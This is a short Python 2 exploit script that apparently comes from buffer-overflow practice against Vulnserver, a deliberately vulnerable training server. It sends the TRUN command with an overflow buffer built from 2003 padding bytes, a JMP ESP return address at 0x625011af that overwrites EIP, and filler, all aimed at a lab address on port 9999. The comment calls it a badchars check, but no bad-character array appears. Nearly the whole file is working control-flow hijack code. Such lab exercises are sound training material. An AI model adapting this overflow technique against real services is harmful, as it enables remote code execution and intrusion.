#!/usr/bin/python

#this is for vulnserver badchars check
import socket
import sys

#JMP ESP located at 0x625011af

offset_to_eip =  2003 
total_size =  5900
jmpesp="\xaf\x11\x50\x62"
buffer = "A" * offset_to_eip
buffer += jmpesp
buffer += "B" * (total_size - len(buffer))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
	connect = s.connect(('192.168.1.13',9999))
	s.send('TRUN /.:/' + buffer)
	s.close()
except:
	print "Check debugger!"